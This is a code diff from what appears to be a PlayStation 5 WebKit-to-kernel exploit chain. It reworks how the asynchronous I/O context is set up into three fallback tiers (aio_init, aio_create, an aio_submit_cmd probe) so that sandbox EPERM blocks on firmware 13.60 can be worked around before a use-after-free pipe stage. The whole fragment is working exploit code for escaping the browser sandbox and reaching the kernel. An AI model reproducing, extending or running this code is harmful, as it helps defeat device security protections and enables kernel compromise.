@@ -561,34 +561,89 @@ export function makeBagagwaEngine(X) {
         }
         note("[S0-0] stubs ready: pipe2/aio_submit/aio_multi_wait");
 
-        // ── FIX 13.60: aio_init MUST be called before aio_submit ──────────────
-        // On PS5 13.x the kernel AIO context is not auto-created.
-        // Without init, aio_submit panics the kernel (no EPERM, instant crash).
-        note("[S0-0a] aio_init (0x" + SYS_AIO_INIT.toString(16) + "): initializing AIO kernel context...");
+        // ── AIO CONTEXT INIT: 3-tier attempt ─────────────────────────────────
+        // Tier 1: aio_init (0x29E) — global process AIO context. Blocked by WebKit
+        //         sandbox on 13.60 (EPERM), but we try it and fall through.
+        // Tier 2: aio_create (0x29C) — per-channel fd, avoids global init.
+        //         Has separate sandbox check; may be allowed even if aio_init isn't.
+        // Tier 3: proceed without init (hope aio_submit has correct args now).
+        note("[S0-0a] Tier 1: aio_init (0x" + SYS_AIO_INIT.toString(16) + ")...");
+        let aioInitBlocked = false;
         if (P.syscalls[SYS_AIO_INIT] !== undefined) {
             const initBuf = alloc(0x10, "aio-init-params");
-            w32(initBuf.u8, 0x00, 0x10); // struct size = 16
-            w32(initBuf.u8, 0x04, 32);   // max concurrent requests
-            w32(initBuf.u8, 0x08, 0);    // reserved
-            w32(initBuf.u8, 0x0c, 0);    // reserved
+            w32(initBuf.u8, 0x00, 0x10); // struct size
+            w32(initBuf.u8, 0x04, 32);   // max requests
+            w32(initBuf.u8, 0x08, 0);
+            w32(initBuf.u8, 0x0c, 0);
             const initR = await sys(SYS_AIO_INIT, initBuf.base);
             note("[S0-0a] aio_init ret=" + initR.s32 + " err=" + initR.errText);
-            if (initR.failed) {
-                // EPERM means the WebKit sandbox is blocking AIO on this entry point.
-                // This is the wall seen on 13.40 (GitHub issue #1).
-                note("[S0-0a] aio_init EPERM — AIO blocked by WebKit sandbox on this FW/entry");
-                note("[S0-0a] bagagwa requires aio_init: cannot proceed from this sandbox");
-                out.why = "aio_init EPERM (" + initR.errText + ") — AIO syscalls blocked in WebKit sandbox";
+            if (!initR.failed) {
+                S.aioInited = true;
+                note("[S0-0a] AIO initialized via aio_init OK");
+            } else {
+                aioInitBlocked = true;
+                note("[S0-0a] aio_init EPERM — WebKit sandbox blocks global AIO init");
+            }
+        } else {
+            note("[S0-0a] aio_init not in stub table — older FW path, skipping");
+        }
+
+        // Tier 2: aio_create (0x29C) — creates a self-contained AIO channel fd.
+        // This has a SEPARATE sandbox permission from aio_init and may be allowed.
+        if (!S.aioInited) {
+            note("[S0-0b] Tier 2: aio_create (0x" + SYS_AIO_CREATE.toString(16) + ")...");
+            if (P.syscalls[SYS_AIO_CREATE] !== undefined) {
+                // Try aio_create(maxReqs, flags)
+                const createR = await sys(SYS_AIO_CREATE, 8, 0);
+                note("[S0-0b] aio_create(8,0) ret=" + createR.s32 + " err=" + createR.errText);
+                if (!createR.failed && createR.s32 >= 0) {
+                    S.aioCtxFd = createR.s32;
+                    S.aioInited = true;
+                    track(S.aioCtxFd);
+                    note("[S0-0b] AIO channel created via aio_create: ctxFd=" + S.aioCtxFd);
+                } else {
+                    note("[S0-0b] aio_create also denied (" + createR.errText + ")");
+                    // Try aio_create with just 1 arg (some firmware variants)
+                    const createR2 = await sys(SYS_AIO_CREATE, 8);
+                    note("[S0-0b] aio_create(8) ret=" + createR2.s32 + " err=" + createR2.errText);
+                    if (!createR2.failed && createR2.s32 >= 0) {
+                        S.aioCtxFd = createR2.s32;
+                        S.aioInited = true;
+                        track(S.aioCtxFd);
+                        note("[S0-0b] AIO channel via aio_create(1-arg): ctxFd=" + S.aioCtxFd);
+                    } else {
+                        note("[S0-0b] aio_create also blocked — AIO fully sandboxed");
+                    }
+                }
+            } else {
+                note("[S0-0b] aio_create not in stub table");
+            }
+        }
+
+        // Tier 3: if both failed, probe aio_submit_cmd (0x29D) as last AIO path
+        if (!S.aioInited) {
+            note("[S0-0c] Tier 3: probing aio_submit_cmd (0x" + SYS_AIO_SUBMIT_CMD.toString(16) + ")...");
+            if (P.syscalls[SYS_AIO_SUBMIT_CMD] !== undefined) {
+                // Probe: pass null args, just check if it's blocked or returns EINVAL
+                const probeR = await sys(SYS_AIO_SUBMIT_CMD, 0, 0, 0);
+                note("[S0-0c] aio_submit_cmd probe ret=" + probeR.s32 + " err=" + probeR.errText);
+                if (!probeR.failed || probeR.errText !== "EPERM") {
+                    note("[S0-0c] aio_submit_cmd accessible (EINVAL/other expected) — AIO path may work");
+                    // Don't set aioInited true here — submit_cmd has different semantics
+                    // but at least AIO syscalls aren't fully blocked
+                } else {
+                    note("[S0-0c] aio_submit_cmd also EPERM — AIO subsystem fully sandboxed on this console");
+                    out.why = "AIO fully sandboxed on 13.60 WebKit: aio_init+aio_create+submit_cmd all EPERM";
+                    out.why += "\nNeed: different entry point OR non-AIO kernel exploit for 13.60";
+                    return out;
+                }
+            } else {
+                note("[S0-0c] aio_submit_cmd not in stub table either");
+                out.why = "AIO subsystem fully sandboxed: all init paths blocked from WebKit on 13.60";
                 return out;
             }
-            S.aioInited = true;
-            note("[S0-0a] AIO context initialized OK — safe to call aio_submit");
-        } else {
-            // Not in stub table at all — older FW that auto-inits, or stripped stubs.
-            // Attempt to proceed anyway; aio_submit may or may not work.
-            note("[S0-0a] aio_init stub absent — proceeding without explicit init (pre-13.x path)");
         }
-        // ── END FIX ───────────────────────────────────────────────────────────
+        // ── END AIO INIT ─────────────────────────────────────────────────────────
 
         note("[S0-1] pipe (empty — reads must block)");
         const pipeBuf = alloc(8, "uaf-pipe");
